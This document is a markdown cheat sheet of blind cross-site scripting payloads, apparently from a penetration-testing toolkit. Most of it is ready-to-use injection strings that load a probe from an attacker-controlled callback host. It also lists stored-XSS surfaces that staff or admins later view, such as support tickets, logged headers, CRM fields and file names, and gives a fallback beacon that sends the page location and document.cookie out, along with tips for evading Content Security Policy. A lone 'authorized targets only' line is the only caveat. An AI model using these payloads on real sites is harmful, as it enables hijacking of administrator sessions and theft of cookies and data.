# blind-xss delivery payloads

Point every payload at `https://<HOST>/c/<TOKEN>`. Use a **distinct TOKEN per
injection point** so callbacks self-identify. `<HOST>` = your worker custom domain.
Cheapest → most evasive. Authorized targets only.

## 1. Baseline — external script (needs `script-src` to allow HOST or be absent)
```html
"><script src=//HOST/c/TOKEN></script>
'><script src=//HOST/c/TOKEN></script>
</textarea><script src=//HOST/c/TOKEN></script>
</title><script src=//HOST/c/TOKEN></script>
<script src=//HOST/c/TOKEN></script>
```

## 2. Attribute / event-handler breakouts (no `<script>` needed)
```html
" onmouseover="import('//HOST/c/TOKEN')" x="
" onfocus="import('//HOST/c/TOKEN')" autofocus x="
"><img src=x onerror="import('//HOST/c/TOKEN')">
"><svg onload="import('//HOST/c/TOKEN')">
javascript:import('//HOST/c/TOKEN')            <!-- href / src / form-action sinks -->
```
`import()` pulls the full probe as a module even from an inline event handler — the
richest capture available without an external `<script>` tag.

## 3. Markup-injection / no-JS-context sinks
```html
<iframe srcdoc="&lt;script src=//HOST/c/TOKEN&gt;&lt;/script&gt;"></iframe>
<svg><animate onbegin="import('//HOST/c/TOKEN')" attributeName=x dur=1s>
<object data="//HOST/c/TOKEN"></object>          <!-- if object-src permits -->
```

## 4. Classic blind-XSS surfaces (where the payload is STORED, admin views later)
Put a payload from §1/§2 into these — they render in a **staff/admin** panel, not yours:
- support tickets / contact forms / "report a problem" / abuse reports
- `User-Agent`, `Referer`, `X-Forwarded-For` headers (logged & rendered in admin log viewers)
- name / company / address / bio / avatar-filename fields shown in a CRM
- order notes, delivery instructions, cancellation reasons
- review/comment bodies moderated in a back-office queue
- filenames of uploaded files (rendered in an admin file browser)
- referral codes, coupon names, saved-search names, calendar-event titles
- SSO/SAML display-name / `givenName` attribute rendered in an IdP admin console

## 5. Strict-CSP degraded payload (no external script, no `connect-src` to HOST)
When CSP blocks both external scripts and `fetch` to HOST, fall back to a self-contained
inline beacon over `img-src` (loses the rich probe; confirms fire + leaks cookie):
```html
"><script>new Image().src='//HOST/p/TOKEN?f=r&s=inline&i=0&n=1&d='+btoa(location+' '+document.cookie)</script>
```
If `img-src` is also locked to `self`, try a DNS/prefetch channel or a
`report-uri`/`report-to` CSP-report exfil (encode data into a violating resource path).

## 6. Notes
- The probe fires **once per document** (`window.__bx` guard) — safe to inject the same
  token in multiple fields on one page.
- `script-src` allowing `https:` or a wildcard CDN? Host the probe behind a matching
  custom domain. `unsafe-inline` present? §2/§5 inline variants work directly.
- Correlate every TOKEN to its surface in the engagement session file (canary registry).
